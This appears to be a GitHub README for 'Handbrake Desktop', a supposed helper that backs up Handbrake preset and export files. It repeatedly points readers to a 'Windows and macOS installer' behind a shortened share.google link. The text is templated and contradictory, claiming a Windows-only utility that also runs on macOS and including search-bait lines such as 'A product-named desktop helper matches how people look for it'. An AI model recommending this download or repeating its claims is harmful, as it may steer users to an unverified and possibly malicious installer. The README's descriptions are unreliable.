![Handbrake Desktop](assets/hero.png)

# Handbrake Desktop

*Keep the Handbrake project folder tidy before an update.*

## What Handbrake Desktop is

**Handbrake Desktop** is a Windows utility. A local helper for Handbrake project folders, preset and export files, and photo albums on Windows and macOS.

Handbrake preset and export files hide under AppData and Documents.

Use it when you want the change on this machine without opening a dozen Settings pages.

## How to get it

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Features

- Maps Handbrake project and cache paths.
- Keeps a dated spare of preset and export files.
- Skips empty and temp folders.
- Leaves the original tree in place.

## The problem

A product-named desktop helper matches how people look for it.

Local copies only. No account step.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/david-martinez-17-create/handbrake-desktop

MIT license. See `LICENSE`.
